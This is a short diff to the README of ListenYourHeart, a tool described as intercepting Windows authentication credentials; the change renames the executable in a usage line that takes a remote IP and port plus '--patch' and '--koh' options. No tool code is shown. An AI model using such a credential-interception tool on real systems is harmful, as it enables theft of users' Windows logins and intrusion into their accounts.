@@ -36,7 +36,7 @@ ListenYourHeart is designed to  intercept Windows authentication credentials and
 
 ## Usage
 ```bash
-LyH.exe <REMOTE_IP> <REMOTE_PORT> [--patch] [--koh <USERNAME>]
+ListenYourHeart.exe <REMOTE_IP> <REMOTE_PORT> [--patch] [--koh <USERNAME>]
 ```
 ### Options
 `--patch` 
